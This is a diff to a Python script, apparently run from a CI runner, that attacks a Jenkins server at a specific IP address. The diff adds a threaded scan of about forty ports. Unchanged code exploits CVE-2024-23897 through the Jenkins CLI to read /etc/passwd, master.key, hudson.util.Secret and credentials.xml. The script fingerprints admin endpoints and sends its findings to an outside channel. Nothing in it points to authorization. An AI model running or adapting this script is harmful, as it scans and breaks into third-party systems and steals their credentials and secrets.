@@ -1,10 +1,12 @@
 #!/usr/bin/env python3
 # GHA runner: read-oriented probe of Jenkins CI at 51.222.15.95:8080
 import os, sys, json, time, socket, subprocess, urllib.request
+from concurrent.futures import ThreadPoolExecutor
 
 HOST = "51.222.15.95"
 PORT = 8080
 TOPIC = os.environ.get("TOPIC", "i47089jenkins-probe")
+MODE = os.environ.get("MODE", "probe")
 
 def log(*a):
     print(" ".join(str(x) for x in a), flush=True)
@@ -29,7 +31,7 @@ def egress():
             pass
     return "ERR"
 
-def tcp(host, port, to=8):
+def tcp(host, port, to=6):
     t0 = time.time()
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.settimeout(to)
@@ -53,13 +55,42 @@ def http(url, to=10, extra=None):
     except Exception as e:
         return "CURLERR:" + str(e)[:100]
 
+BROAD = [21,22,25,53,80,110,443,445,587,993,1080,2019,2375,2376,3000,3128,3306,3389,
+         4243,5000,5432,5601,5672,6379,8000,8008,8080,8081,8082,8083,8084,8085,8090,
+         8180,8443,8888,9000,9090,9200,10000,11211,27017,50000]
+
+def scan_mode(eg):
+    log("=== SCAN MODE", time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()))
+    log("EGRESS", eg)
+    # controls first
+    ctl = {}
+    for h, p in [("40.160.50.80", 3000), ("51.210.13.182", 8000), ("1.1.1.1", 443)]:
+        st, ms = tcp(h, p, 6); ctl["%s:%d" % (h, p)] = st
+        log("CONTROL", "%s:%d" % (h, p), st, str(ms) + "ms")
+    open_ports = []
+    def probe(p):
+        st, ms = tcp(HOST, p, 4)
+        return (p, st, ms)
+    with ThreadPoolExecutor(max_workers=50) as ex:
+        res = list(ex.map(probe, BROAD))
+    for p, st, ms in sorted(res):
+        if st != "TIMEOUT":
+            open_ports.append((p, st, ms))
+            log("PORT", p, st, str(ms) + "ms")
+    log("OPEN_COUNT", len(open_ports), "of", len(BROAD))
+    log("OPENS", json.dumps(open_ports))
+    send("SCAN", "egress=%s controls=%s opens=%s" % (eg, json.dumps(ctl), json.dumps(open_ports)))
+    log("DONE")
+
 def main():
+    eg = egress()
+    if MODE == "scan":
+        scan_mode(eg); return
     log("=== JENKINS PROBE", time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()))
-    eg = egress(); log("EGRESS", eg)
+    log("EGRESS", eg)
     send("EGRESS", eg)
 
     results = {}
-    # Reachability: target + controls
     targets = [(HOST, PORT), (HOST, 443), (HOST, 80), (HOST, 50000), (HOST, 8081), (HOST, 8082),
                ("40.160.50.80", 3000), ("51.210.13.182", 8000), ("1.1.1.1", 443)]
     for h, p in targets:
@@ -72,10 +103,8 @@ def main():
     reachable = results.get("%s:%d" % (HOST, PORT), ("",))[0] == "OPEN"
     log("JENKINS_8080_REACHABLE", reachable)
     if not reachable:
-        # try 443 (maybe behind TLS proxy)
         send("VERDICT", "8080 NOT reachable from runner egress %s; tcp=%s" % (eg, results.get("%s:%d" % (HOST, PORT))))
         log("VERDICT_8080_UNREACHABLE")
-        # still, if 443 open, do an https probe
         if results.get("%s:443" % HOST, ("",))[0] == "OPEN":
             r = http("https://%s/" % HOST, extra=["-k"])
             log("HTTPS_ROOT_HEAD", r[:800].replace("\n", " | "))
@@ -83,35 +112,24 @@ def main():
         return
 
     base = "http://%s:%d" % (HOST, PORT)
-    # Fingerprint + anonymous surface
     probes = {
-        "/": base + "/",
-        "/login": base + "/login",
-        "/api/json": base + "/api/json",
-        "/whoAmI/api/json": base + "/whoAmI/api/json",
-        "/manage": base + "/manage",
+        "/": base + "/", "/login": base + "/login", "/api/json": base + "/api/json",
+        "/whoAmI/api/json": base + "/whoAmI/api/json", "/manage": base + "/manage",
         "/jnlpJars/jenkins-cli.jar": base + "/jnlpJars/jenkins-cli.jar",
-        "/script": base + "/script",
-        "/computer/api/json": base + "/computer/api/json",
+        "/script": base + "/script", "/computer/api/json": base + "/computer/api/json",
     }
-    findings = {}
     for path, url in probes.items():
         r = http(url, to=12)
-        findings[path] = r
-        # print status line + key headers
         head = r.split("\r\n\r\n")[0]
         status = head.split("\r\n")[0] if head else "(no resp)"
-        xjen = [l for l in head.split("\r\n") if l.lower().startswith("x-jenkins") or l.lower().startswith("x-jenkins-cli-port") or l.lower().startswith("server:") or l.lower().startswith("location:") or l.lower().startswith("x-frame")]
+        xjen = [l for l in head.split("\r\n") if l.lower().startswith(("x-jenkins", "server:", "location:", "x-frame"))]
         log("HTTP", path, status, " || ".join(xjen)[:300])
         send("HTTP_" + path.replace("/", "_"), status + "\n" + "\n".join(xjen) + "\nBODY:" + r.split("\r\n\r\n", 1)[-1][:600])
 
-    # CVE-2024-23897 attempt
     try:
         log("=== install java + download cli jar ===")
-        subprocess.run("apt-get install -y -qq default-jre-headless >/dev/null 2>&1 || sudo apt-get install -y -qq default-jre-headless >/dev/null 2>&1", shell=True, timeout=180)
+        subprocess.run("sudo apt-get install -y -qq default-jre-headless >/dev/null 2>&1", shell=True, timeout=240)
         jar = "/tmp/jenkins-cli.jar"
-        dl = http(base + "/jnlpJars/jenkins-cli.jar", to=30)
-        # http() adds -i (headers) which corrupts jar; re-download clean
         subprocess.run(["curl", "-s", "-m", "60", "-o", jar, base + "/jnlpJars/jenkins-cli.jar"], timeout=80)
         sz = os.path.getsize(jar) if os.path.exists(jar) else 0
         log("CLI_JAR_BYTES", sz)
@@ -119,11 +137,8 @@ def main():
         java = subprocess.run(["bash", "-lc", "which java"], capture_output=True, text=True).stdout.strip()
         log("JAVA", java)
         if sz > 10000 and java:
-            # CVE-2024-23897: server-side args4j @file expansion
-            read_targets = ["/etc/passwd", "/var/jenkins_home/secrets/master.key",
-                            "/var/jenkins_home/secrets/hudson.util.Secret",
-                            "/var/jenkins_home/credentials.xml"]
-            for tgt in read_targets:
+            for tgt in ["/etc/passwd", "/var/jenkins_home/secrets/master.key",
+                        "/var/jenkins_home/secrets/hudson.util.Secret", "/var/jenkins_home/credentials.xml"]:
                 for sub in ("connect-node", "help"):
                     cmd = [java, "-jar", jar, "-s", base + "/", "-noCertificateCheck", "-noping", sub, "@" + tgt]
                     try:
@@ -136,7 +151,6 @@ def main():
                         log("CVE23897_ERR", tgt, sub, str(e)[:100])
     except Exception as e:
         log("CVE_SECTION_ERR", str(e)[:200])
-
     log("DONE")
     send("DONE", "probe complete egress=%s reachable=%s" % (eg, reachable))
 
